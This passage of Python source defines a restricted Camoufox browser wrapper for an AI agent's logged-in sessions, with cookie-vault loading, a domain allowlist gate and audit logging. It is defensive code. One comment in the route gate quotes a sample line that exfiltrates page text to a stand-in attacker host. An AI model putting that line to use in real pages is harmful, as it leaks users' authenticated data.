_SELECT_CRITERIA = ("value", "label", "index")

# Playwright's own wait for the select to be actionable, the way `click` has
# one. Short, because a select the snapshot just listed is on the page.
_SELECT_TIMEOUT_MS = 15000

# How long to wait for a URL the change handler is on its way to. A handler
# that navigates starts the navigation inside the dispatch, so what has not
# committed within this has not been started by it; a slower one is the next
# snapshot's news, and every call that does not navigate pays this once.
_SELECT_URL_SETTLE_MS = 750

# What a refusal may list: enough to choose from, and bounded because option
# text is the site's own and it travels into the transcript.
_SELECT_OPTIONS_SHOWN = 20
_SELECT_OPTION_LIMIT = 80


def _match_select_option(
    options: List[dict], by: str, named: Any,
) -> Optional[dict]:
    """The option a criterion names, or None.

    `index` is 0-based over every `<option>` in document order, disabled
    placeholders included — the list `select_option` counts and the list the
    snapshot's `(N options)` counts, so one number means one option in both.
    """
    if by == "index":
        try:
            wanted = int(named)
        except (TypeError, ValueError):
            return None
        return options[wanted] if 0 <= wanted < len(options) else None
    key = "value" if by == "value" else "label"
    target = str(named)
    for option in options:
        if str(option.get(key, "")) == target:
            return option
    # Playwright trims before it compares, so a label differing only by
    # surrounding space is the same option there and must be here too.
    for option in options:
        if str(option.get(key, "")).strip() == target.strip():
            return option
    return None


class AuthBrowser:
    """Restricted Camoufox wrapper for authenticated browser sessions
    (ADR-028 T4, extended for ADR-029 Task 002).

    Two operating modes:

    1. **Single-shot (ADR-028)** — context manager around one `navigate`
       + content read for the headless `browse_page` path:

           with AuthBrowser(agent_id="agent_001", domains=["example.com"]) as ab:
               ab.navigate("https://example.com/my/orders")
               html = ab.get_page_html()

    2. **Stateful session (ADR-029)** — long-lived per-agent session
       supporting interactive methods (scroll, click, fill, etc.) in
       headed Camoufox. Created via `_get_or_create_session(agent_id)`
       from `browse_page(keep_open=True)`; lives in
       `_active_browser_sessions` until explicit close or shutdown.

    Cookies for every domain in `domains` are loaded lazily from the
    encrypted vault (T3 `web_auth.py`) at `_open()` time. Two failure
    modes (raised at first navigate that touches a missing/expired
    domain — not at construction):

      AuthRequiredError — no cookies for a needed domain. User logs
        in via the Tauri WebView popup (T2) before this works.
      AuthExpiredError — cookies present but expired. Same fix.

    Domain restriction is enforced by a Playwright route handler on every
    headless context, seeing every request (redirects and XHR included), with
    `_check_domain` as a cheap pre-navigation agreement in front of it. **A
    headed session is ungated** and carries no route handler at all: a person
    is watching it, and a gate narrow enough to be one also blocks the
    identity providers a sign-in has to reach. What a headed session may
    *write* is unchanged — only cookies inside `_etld1s`.
    """

    def __init__(
        self,
        agent_id: str,
        domains: list[str] | None = None,
        *,
        headed: bool = False,
        domain: str | None = None,
        anonymous: bool = False,
    ):
        from dpc_client_core import web_auth

        self._agent_id = agent_id
        self._headed = headed
        # Carries no identity: opens without the agent's saved cookies and
        # writes none back. For the browse_page JS fallback, which is the
        # *unauthenticated* path — authenticated fetches go through use_auth.
        # Without this the fallback inherited the agent's whole login and ran
        # it as a second, concurrent browser against the same account.
        self._anonymous = anonymous
        # Normalize: accept either `domains=[...]` (new multi-domain) or
        # `domain="..."` (legacy single-domain). Both produce a list.
        if domain is not None and domains is None:
            domains = [domain]
        elif domain is not None and domains is not None:
            raise ValueError("AuthBrowser: pass `domains` or `domain`, not both")
        domains = domains or []
        self._domains = [d.lower() for d in domains]
        # Cleanliness of the *start*, kept apart from `_domains`, which is
        # the scope of the *write*. An unscoped session may go anywhere, so
        # it must arrive as nobody. A scoped one loads the vault jar for its
        # own scope and nothing else — see `_open`.
        self._start_clean = anonymous or not self._domains
        # `resolve_etld1` answers None for a public suffix (`com`), an
        # address or a bare label — none of which names a site. Dropping
        # them keeps the route gate fail-closed: a session left with an
        # empty `_etld1s` blocks every request rather than admitting all
        # of `.com` through `_domain_matches`.
        self._etld1s = {
            e for e in (web_auth.resolve_etld1(d) for d in self._domains)
            if e is not None
        }
        # Backward-compat single-domain alias used by ADR-028 callers.
        self._domain = self._domains[0] if self._domains else None
        self._etld1 = next(iter(self._etld1s), None)
        self._cookies_loaded = False
        self._cm = None
        self._browser = None
        self._context = None
        self._page = None
        self._domain_blocks = 0
        # Repeated gate decisions, folded by `_note_gate_event` and emitted
        # as one summary row each at close.
        self._gate_events: dict[tuple, dict] = {}
        self._disconnected = False
        # Why the last cookie snapshot was not written, so `browser_close`
        # can say it in the chat. None once one has been written.
        self._last_writeback_decline: Optional[str] = None
        self._last_refs: dict[str, dict] = {}
        # Scopes the `data-dpc-el` marks to one snapshot, so a mark left on an
        # element this walk no longer reaches cannot answer a current ref.
        self._snapshot_serial: int = 0
        self._executor: Optional["_PinnedThread"] = None
        self._last_activity: float = time.monotonic()
        # When the window itself last did something. Kept apart from
        # `_last_activity`, which means "the agent called us" and is what
        # the window probe's `_touch=False` contract is written about; two
        # clocks also let the reaper name the one that ran out. 0.0 means
        # no page event yet, and is in the past of any monotonic reading.
        self._last_page_event: float = 0.0
        # Where this session was sent, as a plain string: the idle reaper
        # cannot read `self._page.url` from its own thread.
        self._last_known_url: str = ""
        # PIDs of the Camoufox/Firefox subprocess tree spawned by this
        # browser, captured at launch. Used only as a last-resort kill when
        # close() times out at shutdown (dead Playwright driver) — otherwise
        # the subprocess orphans and survives Python exit. See
        # _force_kill_process.
        self._browser_pids: set[int] = set()
        # True while a `download()` call holds an `expect_download`, so the
        # file it is about to save is not also saved as unclaimed.
        self._download_claimed = False
        self._unclaimed_downloads = 0
        self._download_watched_pages: set[int] = set()

    def _get_executor(self) -> "_PinnedThread":
        """Lazy single-thread runner pinned to this AuthBrowser.

        Playwright sync API objects (Page, BrowserContext, Browser) are
        thread-affine — every call must come from the thread that owns
        the connection. The agent loop is async, so direct calls would
        cross threads via `asyncio.to_thread` (which uses the default
        pool and hands out arbitrary workers). Routing every sync call
        for one AuthBrowser through one dedicated thread keeps every
        Playwright op on the same thread for the lifetime of the
        session, eliminating the `cannot switch to a different thread`
        error surfaced in S155.

        See `_PinnedThread` for why this is not a ThreadPoolExecutor."""
        if self._executor is None:
            self._executor = _PinnedThread(f"camoufox-{self._agent_id}")
        return self._executor

    def _shutdown_executor(self) -> None:
        if self._executor is not None:
            try:
                self._executor.shutdown()
            except Exception:
                pass
            self._executor = None

    @staticmethod
    def _snapshot_child_pids() -> set[int]:
        """PIDs of the current process's descendants, for launch diffing."""
        try:
            import psutil
            return {c.pid for c in psutil.Process().children(recursive=True)}
        except Exception:
            return set()

    def _capture_browser_pids(self, before: set[int]) -> None:
        """Record the subprocess tree that appeared while Camoufox launched
        (Playwright driver + Firefox), for last-resort kill on shutdown."""
        try:
            after = self._snapshot_child_pids()
            self._browser_pids = after - before
            if self._browser_pids:
                log.debug(
                    "tracked Camoufox pids (agent=%s): %s",
                    self._agent_id, sorted(self._browser_pids),
                )
        except Exception as e:
            log.debug("browser pid capture failed (agent=%s): %s", self._agent_id, e)

    def _force_kill_process(self) -> None:
        """Kill the Camoufox/Firefox subprocess tree captured at launch.

        Last resort for shutdown only: when close() times out because the
        Playwright driver connection is dead, the graceful __exit__ never
        completes and the browser subprocess orphans, surviving Python exit
        and forcing the user to kill it by hand. Killing the captured tree
        (plus any content processes it spawned since) prevents the orphan and
        lets the stuck executor thread unwind. Best-effort and idempotent."""
        pids = self._browser_pids
        if not pids:
            return
        try:
            import psutil
        except Exception:
            return
        victims: list = []
        for pid in list(pids):
            try:
                proc = psutil.Process(pid)
                victims.append(proc)
                victims.extend(proc.children(recursive=True))
            except psutil.NoSuchProcess:
                continue
            except Exception:
                continue
        for proc in victims:
            try:
                proc.terminate()
            except Exception:
                pass
        try:
            _gone, alive = psutil.wait_procs(victims, timeout=2)
        except Exception:
            alive = victims
        for proc in alive:
            try:
                proc.kill()
            except Exception:
                pass
        if victims:
            log.info(
                "Force-killed %d Camoufox subprocess(es) during shutdown "
                "(agent=%s)",
                len(victims), self._agent_id,
            )
        self._browser_pids = set()

    def __enter__(self):
        self._open()
        return self

    def __exit__(self, exc_type, exc, tb):
        self.close()
        return False

    @property
    def domain(self) -> str | None:
        return self._domain

    @property
    def domains(self) -> list[str]:
        return list(self._domains)

    @property
    def headed(self) -> bool:
        return self._headed

    def start(self) -> None:
        """Explicit lifecycle entry — open the browser without context
        manager. Idempotent: no-op if already open. Used by the stateful
        session path where the caller does not own a `with` block."""
        if self._page is None:
            self._open()

    def _load_all_cookies(
        self,
        domains: Optional[list[str]] = None,
        skip_missing: bool = False,
    ) -> list[dict]:
        """Merge cookies for every configured domain. Raises
        AuthRequiredError / AuthExpiredError on first missing or expired
        domain so the caller can surface a re-login prompt for the
        specific eTLD+1 that needs attention.

        `domains` overrides `self._domains` — used by `_open()` to load
        a subset of domains. `skip_missing=True` swallows missing/expired
        vault entries, so a session opens on a site it has no cookies for
        and the person can sign in there; default `False` keeps the strict
        surface for any explicit single-domain call.
        """
        from dpc_client_core import web_auth

        target = domains if domains is not None else self._domains
        all_cookies: list[dict] = []
        for d in target:
            cookies = web_auth.load_cookies(self._agent_id, d)
            if cookies is None:
                if skip_missing:
                    log.debug("vault: no cookies for %s, skipping", d)
                    continue
                raise AuthRequiredError(
                    f"No cookies for {d} (agent={self._agent_id}) — re-login required"
                )
            filtered = web_auth.filter_expired(cookies)
            if not filtered:
                if skip_missing:
                    log.debug("vault: all cookies for %s expired, skipping", d)
                    continue
                raise AuthExpiredError(
                    f"Cookies for {d} expired (agent={self._agent_id}) — re-login required"
                )
            all_cookies.extend(filtered)
        self._cookies_loaded = True
        return all_cookies

    def _open(self) -> None:
        from camoufox.sync_api import Camoufox

        before_pids = self._snapshot_child_pids()
        self._cm = Camoufox(headless=not self._headed, **_camoufox_launch_kwargs())
        self._browser = self._cm.__enter__()
        self._capture_browser_pids(before_pids)
        try:
            self._browser.on("disconnected", self._on_browser_disconnected)
        except Exception as e:
            log.debug(
                "attach disconnect listener failed (agent=%s): %s",
                self._agent_id, e,
            )

        # No `storage_state`, for any session: browser_state.json was a
        # second identity store, accumulating every cookie the agent had
        # ever collected across every site. A session's identity is exactly
        # the vault jar for its own scope, and a clean-start session has
        # none at all.
        #
        # `no_viewport` for a visible window only. Playwright pins a fixed
        # 1280x720 viewport unless told otherwise, so maximising the window
        # moved nothing: the page kept rendering into that rectangle in the
        # top-left corner and the rest of the frame stayed blank. A visible
        # window belongs to a person who resizes it, so the page has to
        # follow the frame; a headless one belongs to a measurement —
        # `browser_screenshot` and the page snapshots — which is only
        # comparable between runs while the page size cannot move.
        self._context = self._browser.new_context(
            **_new_context_kwargs(self._headed)
        )
        self._install_domain_route_handler()

        # skip_missing=True keeps the open path tolerant of a scope whose
        # vault entry is absent or expired: nothing else can cover the gap
        # now, so the re-login need surfaces at the first protected request
        # rather than failing a session that may never make one.
        if self._domains and not self._start_clean:
            self._inject_vault_cookies(
                domains=list(self._domains), skip_missing=True
            )

        # Every page, not just the first: a file can also start in a tab the
        # site opened.
        try:
            self._context.on("page", self._watch_for_unclaimed_downloads)
        except Exception as e:
            log.debug(
                "attach download capture to the context failed (agent=%s): %s",
                self._agent_id, e,
            )
        self._page = self._context.new_page()
        _attach_page_diagnostics(self._page, agent_id=self._agent_id)
        self._watch_for_unclaimed_downloads(self._page)
        _active_camoufox_browsers.add(self)

    def _inject_vault_cookies(
        self,
        domains: Optional[list[str]] = None,
        skip_missing: bool = False,
    ) -> None:
        self._context.add_cookies(
            _to_playwright_cookies(
                self._load_all_cookies(domains=domains, skip_missing=skip_missing)
            )
        )

    def _scope_cookies_by_etld1(self, cookies: list[dict]) -> dict[str, list[dict]]:
        """Group the in-scope cookies by their jar, in vault shape.

        Writes nothing: the one place that says which of a browser's
        cookies belong to this session's scope, so an ungated visible window
        cannot widen what a session stores."""
        if not self._etld1s or not cookies:
            return {}

        by_etld1: dict[str, list[dict]] = {}
        for c in cookies:
            raw = (c.get("domain") or "").lstrip(".").lower()
            if not raw:
                continue
            matched = None
            for allowed in self._etld1s:
                if raw == allowed or raw.endswith("." + allowed):
                    matched = allowed
                    break
            if matched is None:
                continue
            by_etld1.setdefault(matched, []).append(c)

        return {
            d: _from_playwright_cookies(items) for d, items in by_etld1.items()
        }

    def _sync_cookies_to_vault(self, cookies: list[dict]) -> _WritebackTally:
        """Write the session's in-scope cookies to the vault. Returns what
        the write did, in the terms the audit row carries: how many cookies
        landed, which jars refused, how many jars took them, and whether a
        session cookie is among what was written.

        The tally is counted here because this is the only place holding
        the cookies in vault shape; counting it again at the call site
        would mean asking the context for its cookies twice and could
        answer about a different snapshot than the one that was stored.

        This is how a sign-in the person performed in a visible window
        reaches the vault: they log in, the page sets its cookies, and the
        writeback after each navigate and at close copies the ones inside
        `_etld1s`. Nothing else is stored, and nothing is inferred from
        what appears.

        A jar refuses when the snapshot holds nothing sendable for it.
        `web_auth.save_cookies` owns that condition, because it is about the
        cookies and not about this session."""
        from dpc_client_core import web_auth

        written = 0
        jars = 0
        session_cookie = False
        refused: list[str] = []
        for domain, items in self._scope_cookies_by_etld1(cookies).items():
            if web_auth.save_cookies(self._agent_id, domain, items):
                written += len(items)
                jars += 1
                session_cookie = session_cookie or any(
                    c.get("expires") is None for c in items
                )
            else:
                refused.append(domain)
        return _WritebackTally(written, refused, jars, session_cookie)

    def _audit_cookie_writeback(self, result: str, **fields: Any) -> None:
        """One `cookie_writeback` row per writeback, taken or refused, so
        an empty audit means no writeback ran rather than none succeeded.
        `result` separates them: `ok` beside the refusals' `declined`.

        The row names no cookie and no host the scope does not already
        name: the page URL and the eTLD+1 `_audit_action` attaches are the
        two the refusal rows carry."""
        url = ""
        page = self._page
        if page is not None:
            try:
                url = page.url
            except Exception:
                pass
        self._audit_action("cookie_writeback", url, result, **fields)

    def _decline_cookie_writeback(self, reason: str, *, notify: bool = True) -> None:
        """Record a snapshot that was not written, and leave the reason
        where `browser_close` can turn it into a sentence in the chat.

        `notify=False` keeps the audit row and drops the sentence, for the
        case the person already knows about: they closed the window."""
        if notify:
            self._last_writeback_decline = reason
        log.log(
            logging.DEBUG if not notify else logging.WARNING,
            "cookie writeback declined for agent=%s (%s) — the stored jar is "
            "left as it was",
            self._agent_id, reason,
        )
        self._audit_cookie_writeback("declined", reason=reason)

    def _persist_session_cookies(self) -> str:
        """Copy this session's in-scope cookies into the vault. Returns the
        reason it took, written or not.

        Nothing about the page conditions this write, and a page test must
        not be put back: a marker search over HTML that is almost all inline
        script answers about the site's infrastructure, not about the page,
        and it declined a real sign-in every time it was asked.

        A window arriving with no session must still not write the site's
        guest cookies over a stored login, and two facts prevent that
        instead, neither reachable from a page. A scoped window opens
        carrying the vault's own jar for its scope (see `_open`), so its
        snapshot already holds the login it might displace; and
        `web_auth.save_cookies` refuses a snapshot with nothing sendable in
        it over a jar that has something, with `restore_previous_cookies`
        behind that.

        browser_state.json is neither read (see `_open`) nor written any
        more — the file on disk is left alone, but nothing here maintains
        it."""
        if self._context is None:
            return "no_context"
        if self._anonymous or self._open_scope:
            # Carries no identity and owns no jar, so it has nothing to say.
            return "no_scope"
        try:
            tally = self._sync_cookies_to_vault(self._context.cookies())
        except Exception as e:
            if self._disconnected:
                log.debug(
                    "cookie writeback skipped for agent=%s "
                    "(browser closed mid-save): %s",
                    self._agent_id, e,
                )
            else:
                log.warning(
                    "cookie writeback failed for agent=%s: %s",
                    self._agent_id, e,
                )
            self._decline_cookie_writeback(
                "write_failed", notify=not self._disconnected,
            )
            return "write_failed"
        if tally.refused:
            reason = (
                "nothing_sendable_in_snapshot:" + ",".join(sorted(tally.refused))
            )
            self._decline_cookie_writeback(reason)
            return reason
        if not tally.cookies:
            self._decline_cookie_writeback("no_cookies_in_scope")
            return "no_cookies_in_scope"
        self._audit_cookie_writeback(
            "ok",
            cookies_written=tally.cookies,
            jars=tally.jars,
            has_session_cookie=tally.session_cookie,
        )
        self._last_writeback_decline = None
        return "written"

    def _install_domain_route_handler(self) -> None:
        """A headless context takes the route gate; a headed one takes events.

        An intercepted request is parked in Firefox until Python answers, and
        the sync Playwright API pumps its dispatcher only from inside an API
        call (`_sync_base.py::_sync`) — so an idle session answers nothing
        until the `sweep_closed_windows` probe re-enters Playwright, and the
        window advances one probe interval at a time. A visible window is
        ungated anyway, so it takes the same rows from an event instead.

        Returning early for an unscoped session left the one path where a
        browser carried the agent's saved cookies and answered to nobody.
        An open-scope session costs one Python callback per request, which
        is why `_domain_route_gate` answers that case first."""
        if self._context is None:
            return
        if self._headed:
            self._install_visible_window_trail()
            return
        self._context.route("**/*", self._domain_route_gate)

    def _install_visible_window_trail(self) -> None:
        """`request`, not `requestfinished`/`requestfailed`: the trail answers
        where the window went, and an outcome-based pair would fold both
        results under one `_note_gate_event` key, of which only the first is
        written. Outcomes are already logged by `_attach_page_diagnostics`."""
        if self._context is None:
            return
        try:
            self._context.on("request", self._note_visible_request)
        except Exception as e:
            log.debug(
                "attach visible-window trail failed (agent=%s): %s",
                self._agent_id, e,
            )

    def _note_visible_request(self, request) -> None:
        """The rows the gate wrote for a visible window, under the same two
        filters it applied first. Runs inside Playwright's dispatcher fiber,
        where a raise would land in its pump — so every read is guarded."""
        try:
            url = request.url
        except Exception:
            return
        if not url.startswith(("http://", "https://")):
            return
        # A person filling in a sign-in form is use, with the agent silent
        # throughout — and what counts as use is a different question from
        # what the scope filter below decides to audit. Stamped late rather
        # than at the request: the sync dispatcher runs only while a thread
        # is inside a Playwright call, which for a parked window is the
        # `sweep_closed_windows` probe.
        self._last_page_event = time.monotonic()
        if self._open_scope:
            return
        try:
            self._note_gate_event(
                self.GATE_ACTION_VISIBLE_PASSTHROUGH, url, "ok",
                site=self._etld1 or "", host=_url_host(url),
                method=_request_method(request),
                resource_type=_request_resource_type(request),
                initiator_of=request,
            )
        except Exception as e:
            log.debug("visible-window trail row failed (%s): %s", url, e)

    @property
    def _open_scope(self) -> bool:
        """No scope was asked for, so none is enforced — and in exchange the
        session carries no identity (`_start_clean`, set in `__init__`).

        Distinct from `_domains` non-empty with `_etld1s` empty, which is a
        scope that was asked for and could not be resolved: that one denies
        everything, because admitting `.com` is not what `domains=["com"]`
        was meant to say."""
        return not self._domains

    def _domain_route_gate(self, route) -> None:
        try:
            request = route.request
            url = request.url
        except Exception:
            # Unknown Route shape — fail-closed rather than let request through.
            try:
                route.abort()
            except Exception:
                pass
            return

        if self._open_scope or not url.startswith(("http://", "https://")):
            try:
                route.continue_()
            except Exception:
                pass
            return

        # An unresolved scope used to abort here, before the request was
        # read. It reached the same refusal either way — the loop below
        # cannot match an empty set and `_frame_site` cannot be found in
        # one — so the only thing the early exit bought was an audit row
        # with no method, kind or initiator on it. Falsifying the suite on
        # 2026-09-13 found nothing that could tell the two paths apart,
        # which is what an equivalent mutant looks like. Mike's call.
        host = _url_host(url)
        for allowed in self._etld1s:
            if _domain_matches(url, allowed):
                try:
                    route.continue_()
                except Exception:
                    pass
                return

        # A site's own bundle lives on CDN hosts the allowlist never names
        # (x.com boots from abs.twimg.com, ozon.ru styles from st.ozone.ru),
        # so a name-by-name list can only ever render sites partially. A
        # GET/HEAD *subresource* passes when both ends are constrained: the
        # initiating frame is inside the allowlist, and the host being
        # contacted is one this site's manifest names. Constraining only the
        # initiator would leave `new Image().src = "https://evil.tld/?d=" +
        # document.body.innerText` — a GET carries data out in its URL — and
        # `<script src>` running foreign code inside the authenticated origin.
        # Navigation is excluded explicitly rather than by method, because a
        # document request carries the current frame too.
        _method = ""
        _resource_type = ""
        try:
            _is_nav = (
                request.is_navigation_request()
                or request.resource_type == "document"
            )
            _method = request.method or ""
            _resource_type = request.resource_type or ""
            _method_ok = _method in ("GET", "HEAD")
            _frame = request.frame
            _frame_url = _frame.url if _frame is not None else ""
        except Exception:
            _is_nav, _method_ok, _frame_url = False, False, ""
        _frame_site = None
        if _frame_url.startswith(("http://", "https://")):
            _frame_site = next(
                (a for a in self._etld1s if _domain_matches(_frame_url, a)), None
            )
        if _method_ok and not _is_nav and _frame_site is not None:
            from dpc_client_core import web_auth

            if host in web_auth.cdn_manifest_hosts(_frame_site):
                self._on_subresource_passed(
                    url, host, site=_frame_site, initiator=_frame_url,
                    method=_method, resource_type=_resource_type,
                )
                try:
                    route.continue_()
                except Exception:
                    pass
                return
            self._on_subresource_unlisted(
                url, host, site=_frame_site, initiator=_frame_url,
                method=_method, resource_type=_resource_type,
            )
            try:
                route.abort()
            except Exception:
                pass
            return

        self._on_domain_blocked(
            url, host, site=_frame_site or self._etld1 or "",
            initiator=_frame_url,
            method=_method, resource_type=_resource_type,
        )
        try:
            route.abort()
        except Exception:
            pass

    # Audit actions the gate emits. A request refused as unlisted is a
    # candidate for the manifest; one refused outright is not, and telling
    # them apart in the log is the difference between "this site needs a
    # host" and "something tried to leave".
    GATE_ACTION_PASSTHROUGH = "subresource_passthrough"
    GATE_ACTION_UNLISTED = "subresource_blocked_unlisted"
    GATE_ACTION_BLOCKED = "domain_blocked"
    # A visible window enforces nothing, so its rows are not passthroughs
    # through a gate — they are the trail of where an ungated window went.
    GATE_ACTION_VISIBLE_PASSTHROUGH = "visible_window_passthrough"
    GATE_SUMMARY_SUFFIX = "_summary"

    def _note_gate_event(
        self, action: str, url: str, result: str, *,
        site: str, host: str, method: str, resource_type: str,
        initiator: str = "", initiator_of=None,
    ) -> bool:
        """Write the first of a repeating gate decision and count the rest.

        A page load repeats the same (site, host, method, kind) decision
        hundreds of times, and one synchronous file open per repeat buried
        the `domain_blocked` rows the audit exists for. The first occurrence
        is always written — a count that arrives at close is no substitute
        for knowing when a host first appeared — and the repeats are folded
        into one summary row by `_flush_gate_audit`. Returns True when this
        was the first occurrence.

        A repeat must reach its count having done as little as possible, so
        anything not in the key is read after the lookup. `initiator_of`
        takes the Playwright request and is asked for its frame URL only
        when a row is written; a caller already holding the string passes
        `initiator` instead."""
        key = (action, site, host, method, resource_type)
        rec = self._gate_events.get(key)
        if rec is not None:
            rec["count"] += 1
            return False
        if initiator_of is not None and not initiator:
            initiator = _request_initiator(initiator_of)
        self._gate_events[key] = {
            "action": action, "result": result, "site": site, "host": host,
            "method": method, "resource_type": resource_type,
            "url": url, "initiator": initiator, "count": 1,
        }
        self._audit_gate_row(
            action, url, result, site=site, dest_host=host,
            initiator=initiator, method=method, resource_type=resource_type,
            first_seen=True,
        )
        return True

    def _audit_gate_row(self, action: str, url: str, result: str, **fields) -> None:
        # Audit failure must never alter a request — the caller's decision is
        # already made by the time this runs.
        try:
            from dpc_client_core import web_auth
            web_auth.log_browser_action(
                agent_id=self._agent_id,
                domain=fields.get("dest_host") or "",
                action=action,
                url=url,
                result=result,
                **fields,
            )
        except Exception as exc:
            log.warning("audit emit failed (%s %s): %s", action, url, exc)

    def _flush_gate_audit(self) -> None:
        """One summary row per repeated decision, and the refusal counts
        the first-seen writes did not yet carry. Called from `close()`."""
        from dpc_client_core import web_auth

        _reason_of = {
            self.GATE_ACTION_UNLISTED: web_auth.REFUSAL_REASON_UNLISTED,
            self.GATE_ACTION_BLOCKED: web_auth.REFUSAL_REASON_BLOCKED,
        }
        pending, self._gate_events = self._gate_events, {}
        refusals: list[tuple] = []
        for rec in pending.values():
            repeats = rec["count"] - 1
            if repeats <= 0:
                continue
            self._audit_gate_row(
                rec["action"] + self.GATE_SUMMARY_SUFFIX,
                rec["url"], rec["result"],
                site=rec["site"], dest_host=rec["host"],
                initiator=rec["initiator"], method=rec["method"],
                resource_type=rec["resource_type"], count=rec["count"],
            )
            reason = _reason_of.get(rec["action"])
            if reason is not None and rec["site"] and rec["host"]:
                refusals.append(
                    (rec["site"], rec["host"], repeats, reason)
                )
        if refusals:
            try:
                web_auth.record_cdn_refusals(self._agent_id, refusals)
            except Exception as exc:
                log.warning("CDN refusal flush failed: %s", exc)

    def _on_subresource_passed(
        self, url: str, host: str, *, site: str = "", initiator: str = "",
        method: str = "", resource_type: str = "",
    ) -> None:
        # Allow-side mirror of `_on_domain_blocked`: the audit trail must be
        # able to answer "what did the gate let through", not only what it cut.
        # For a passthrough the security-relevant fact is who initiated it.
        self._note_gate_event(
            self.GATE_ACTION_PASSTHROUGH, url, "ok",
            site=site, host=host, initiator=initiator,
            method=method, resource_type=resource_type,
        )

    def _on_subresource_unlisted(
        self, url: str, host: str, *, site: str, initiator: str = "",
        method: str = "", resource_type: str = "",
    ) -> None:
        """Refused because the site's manifest does not name this host —
        and recorded so a human can later be asked about it.

        The record confers nothing. It is written to a different file from
        the manifest the gate reads, so the act of trying can never be the
        act of being allowed."""
        self._domain_blocks += 1
        first = self._note_gate_event(
            self.GATE_ACTION_UNLISTED, url, "denied",
            site=site, host=host, initiator=initiator,
            method=method, resource_type=resource_type,
        )
        if first:
            try:
                from dpc_client_core import web_auth
                web_auth.record_cdn_refusals(
                    self._agent_id,
                    [(site, host, 1, web_auth.REFUSAL_REASON_UNLISTED)],
                )
            except Exception as exc:
                log.warning("CDN refusal write failed (%s): %s", host, exc)

    def _on_domain_blocked(
        self, url: str, etld1: str, *, site: str = "", initiator: str = "",
        method: str = "", resource_type: str = "",
    ) -> None:
        """Refused outright — wrong method, a navigation, or a scope that
        resolved to nothing.

        Recorded too, and for the same reason as the manifest branch: a host
        refused here left no trace at all, so a site broken by this branch
        stayed broken with nothing for a human to act on. The refusal
        carries which branch made it, because promoting a host the
        manifest path never consults would not unblock it."""
        # `etld1` here is the BLOCKED domain, not an auth domain.
        self._domain_blocks += 1
        first = self._note_gate_event(
            self.GATE_ACTION_BLOCKED, url, "denied",
            site=site, host=etld1, initiator=initiator,
            method=method, resource_type=resource_type,
        )
        if first and site and etld1:
            try:
                from dpc_client_core import web_auth
                web_auth.record_cdn_refusals(
                    self._agent_id,
                    [(site, etld1, 1, web_auth.REFUSAL_REASON_BLOCKED)],
                )
            except Exception as exc:
                log.warning("CDN refusal write failed (%s): %s", etld1, exc)

    def _current_etld1(self) -> str:
        if self._page is not None:
            try:
                from dpc_client_core import web_auth
                # None on an about:/data: page or a bare-label host — fall
                # through to the session's own domain rather than writing
                # `null` into the audit trail.
                current = web_auth.resolve_etld1(self._page.url)
                if current is not None:
                    return current
            except Exception:
                pass
        return self._etld1 or "unknown"

    def _audit_action(
        self, action: str, url: str, result: str, **extra: Any
    ) -> None:
        # Best-effort: failed audit write must not fail the user action.
        try:
            from dpc_client_core import web_auth
            web_auth.log_browser_action(
                agent_id=self._agent_id,
                domain=self._current_etld1(),
                action=action,
                url=url,
                result=result,
                **extra,
            )
        except Exception as exc:
            log.warning("audit emit failed (%s %s): %s", action, url, exc)

    def _require_open(self) -> None:
        if self._page is None:
            raise RuntimeError(
                "AuthBrowser not opened — use as context manager or call start()"
            )

    def _check_domain(self, url: str) -> None:
        """Pre-navigation fail-fast gate. Cheaper than waiting for the
        Playwright route handler to abort (no browser round-trip) and
        gives a clean ValueError for off-domain navigate() calls. The
        route handler installed in `_install_domain_route_handler` is
        the authoritative gate that also catches in-page redirects and
        XHR — this method is the convenience layer in front of it."""
        if self._open_scope:
            return  # nothing was scoped, so nothing is off-scope
        if self._headed:
            return  # no gate is installed on a visible window; agreeing here
            # is what keeps the two layers saying the same thing
        if not self._etld1s:
            # A scope was asked for and none of it resolved to a registrable
            # domain. The gate denies every request in that state; agreeing
            # with it here is what makes the two layers say the same thing.
            raise ValueError(
                f"URL {url!r} is outside auth domains: none of "
                f"{self._domains!r} names a registrable domain"
            )
        for etld1 in self._etld1s:
            if _domain_matches(url, etld1):
                return
        raise ValueError(
            f"URL {url!r} is outside auth domains {sorted(self._etld1s)!r}"
        )

    def _wait_for_content_stable(self, timeout_ms: int = 10000) -> None:
        """Wait for JS-rendered text content to stabilize after networkidle.

        networkidle fires when no network requests arrive for 500ms, but
        JS frameworks (Google AI Mode, React/Vue lazy hydration, SPA
        routers) continue mutating the DOM via setTimeout / RAF / XHR
        callbacks after that gate. A snapshot taken at networkidle sees
        the element shell but empty text nodes.

        Two-phase wait: (1) wait for at least one mutation of
        document.body.innerText length past the initial reading — this
        skips the "Loading..." stub that is stable-but-incomplete; (2)
        then wait for the length to stop changing for 1s. Bounded by
        timeout_ms so pages that never mutate (static content) or never
        stabilize (infinite scroll) do not hang."""
        try:
            self._page.wait_for_function(
                """() => {
                    const cur = (document.body.innerText || '').length;
                    if (window.__cc_initial_len === undefined) {
                        window.__cc_initial_len = cur;
                        window.__cc_last_len = cur;
                        window.__cc_stable_since = Date.now();
                        return false;
                    }
                    if (cur !== window.__cc_last_len) {
                        window.__cc_last_len = cur;
                        window.__cc_stable_since = Date.now();
                        return false;
                    }
                    if (cur === window.__cc_initial_len) return false;
                    return (Date.now() - window.__cc_stable_since) >= 1000;
                }""",
                timeout=timeout_ms,
            )
        except Exception as exc:
            log.debug("content-stable wait timed out or failed: %s", exc)

    def navigate(self, url: str) -> str:
        """Navigate to URL and return the post-navigation accessibility
        snapshot inline (ADR-029 Task 006 auto-snapshot — eliminates the
        extra `a11y_snapshot()` round-trip the agent would otherwise
        need after every navigation). Snapshot failure is non-fatal
        — navigation still succeeds, returned text is "" with the
        underlying error name recorded in the audit entry.

        URL eTLD+1 must match one of the session's auth domains;
        in-page redirects and XHR are gated by the Playwright route
        handler installed at session open (ADR-029 Task 003).

        Replaces ADR-028 `goto()` — kept as an alias for back-compat."""
        self._require_open()
        try:
            from_url = self._page.url
        except AttributeError:
            from_url = ""
        try:
            self._check_domain(url)
        except ValueError as exc:
            self._audit_action(
                "navigate", url, "denied",
                from_url=from_url, error=str(exc),
            )
            raise
        try:
            response = self._page.goto(
                url, wait_until="domcontentloaded", timeout=60000,
            )
        except Exception as exc:
            self._audit_action(
                "navigate", url, "failed",
                from_url=from_url, **_audit_error(exc),
            )
            raise
        status = response.status if response is not None else None
        self._last_known_url = url
        self._wait_for_content_stable()
        snapshot_text = ""
        snapshot_audit: dict[str, Any] = {"from_url": from_url}
        if status is not None:
            snapshot_audit["status"] = status
        try:
